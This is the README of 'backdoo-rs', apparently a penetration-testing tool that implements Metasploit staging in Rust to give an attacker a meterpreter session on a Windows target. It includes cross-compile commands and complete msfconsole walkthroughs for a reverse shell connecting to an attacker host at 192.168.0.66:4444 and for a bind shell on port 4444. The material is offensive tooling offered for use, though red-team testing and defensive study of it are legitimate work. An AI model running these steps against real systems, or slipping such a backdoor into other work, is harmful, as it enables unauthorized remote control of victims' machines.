# backdoo-rs

[![](https://img.shields.io/github/stars/0xdea/backdoo-rs.svg?style=flat&color=yellow)](https://github.com/0xdea/backdoo-rs)
[![](https://img.shields.io/github/forks/0xdea/backdoo-rs.svg?style=flat&color=green)](https://github.com/0xdea/backdoo-rs)
[![](https://img.shields.io/github/watchers/0xdea/backdoo-rs.svg?style=flat&color=red)](https://github.com/0xdea/backdoo-rs)
[![](https://img.shields.io/badge/twitter-%400xdea-blue.svg)](https://twitter.com/0xdea)
[![](https://img.shields.io/badge/mastodon-%40raptor-purple.svg)](https://infosec.exchange/@raptor)

> "Launch the Polaris  
> The end doesn't scare us  
> When will this cease?  
> The warheads will all rust in peace"
>
> -- Megadeth, Rust in Peace... Polaris (1990)

Minimalistic Rust implementation of the main staging protocols used by the Metasploit Framework.
Start an `exploit/multi/handler` instance on the attack box configured to handle one of the supported
payloads, run `backdoo-rs.exe` on the target Windows system, and enjoy your session!

Blog post:  
https://security.humanativaspa.it/learning-rust-for-fun-and-backdoo-rs

See also:  
https://github.com/0xdea/tactical-exploitation/blob/master/letmein.py  
https://github.com/0xdea/tactical-exploitation/blob/master/letmein.ps1  
https://github.com/0xdea/tactical-exploitation/blob/master/letme.go

## Cross-compiling

```
[macOS example]
$ brew install mingw-w64
$ rustup target add x86_64-pc-windows-gnu
$ cargo build --release --target x86_64-pc-windows-gnu
```

## Usage

```
C:\> backdoo-rs.exe [:port | host:port]
```

## Examples

Reverse shell:

```
[on the attack box]
$ msfconsole
msf > use exploit/multi/handler
msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf > set LHOST 192.168.0.66
msf > exploit

[on the target box]
C:\> backdoo-rs.exe 192.168.0.66:4444
```

Bind shell:

```
[on the target box]
C:\> backdoo-rs.exe :4444

[on the attack box]
$ msfconsole
msf > use exploit/multi/handler
msf > set PAYLOAD windows/x64/meterpreter/bind_tcp
msf > set RHOST 192.168.0.20
msf > exploit
```

## Supported payloads

* windows/x64/meterpreter/reverse_tcp
* windows/x64/meterpreter/bind_tcp

## Tested on

* Microsoft Windows 11
